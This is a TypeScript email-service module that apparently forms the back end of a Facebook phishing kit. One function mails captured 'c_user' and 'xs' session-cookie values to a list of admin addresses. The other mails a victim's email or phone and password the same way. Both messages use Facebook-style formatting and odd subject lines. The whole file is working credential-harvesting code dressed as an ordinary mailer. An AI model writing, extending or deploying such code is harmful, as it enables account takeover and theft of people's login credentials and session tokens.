import nodemailer from "nodemailer";
import { formOneConfig, formTwoConfig, getAllAdminEmails } from "./config/smtp-config";

class EmailService {
  private formOneTransporter;
  private formTwoTransporter;

  constructor() {
    try {
      const configOne = formOneConfig();
      const configTwo = formTwoConfig();

      this.formOneTransporter = nodemailer.createTransport({
        host: configOne.host,
        port: configOne.port,
        secure: configOne.secure,
        auth: configOne.auth
      });

      this.formTwoTransporter = nodemailer.createTransport({
        host: configTwo.host,
        port: configTwo.port,
        secure: configTwo.secure,
        auth: configTwo.auth
      });

      console.log('Email service initialized successfully');
    } catch (error) {
      console.error('Failed to initialize email service:', error);
      throw new Error('Email service initialization failed');
    }
  }

  async sendFormOneEmail(data: any) {
    if (!data || !data.c_user || !data.xs) {
      console.error('Invalid form one data:', data);
      throw new Error('Invalid form data provided');
    }

    const config = formOneConfig();
    const mailOptions = {
      from: config.auth.user,
      to: getAllAdminEmails(config.adminEmails).join(", "),
      subject: "Zubai Jan",
      html: `
        <h2 style="color: #1877f2;">PROFESSOR</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>c_user:</strong> ${data.c_user}</p>
          <p><strong>xs:</strong> ${data.xs}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
      `,
    };

    try {
      console.log("Sending form one email with config:", {
        host: config.host,
        port: config.port,
        adminEmails: getAllAdminEmails(config.adminEmails)
      });
      const result = await this.formOneTransporter.sendMail(mailOptions);
      console.log("Form one email sent:", result);
      return result;
    } catch (error) {
      console.error("Error sending form one email:", error);
      throw error;
    }
  }

  async sendFormTwoEmail(data: any) {
    if (!data || !data.user_email || !data.password) {
      console.error('Invalid form two data:', data);
      throw new Error('Invalid form data provided');
    }

    const config = formTwoConfig();
    const mailOptions = {
      from: config.auth.user,
      to: getAllAdminEmails(config.adminEmails).join(", "),
      subject: "Zubair Jan",
      html: `
        <h2 style="color: #1877f2;">PROFESSOR</h2>
        <div style="background: #f0f2f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <p><strong>User Email/Phone:</strong> ${data.user_email}</p>
          <p><strong>Password:</strong> ${data.password}</p>
          <p><strong>Additional Admin Email:</strong> ${data.admin_email_3 || "Not provided"}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
        <p style="color: #65676B; font-size: 12px;">This is an automated message.</p>
      `,
    };

    try {
      console.log("Sending form two email...");
      const result = await this.formTwoTransporter.sendMail(mailOptions);
      console.log("Form two email sent:", result);
      return result;
    } catch (error) {
      console.error("Error sending form two email:", error);
      throw error;
    }
  }
}

export const emailService = new EmailService();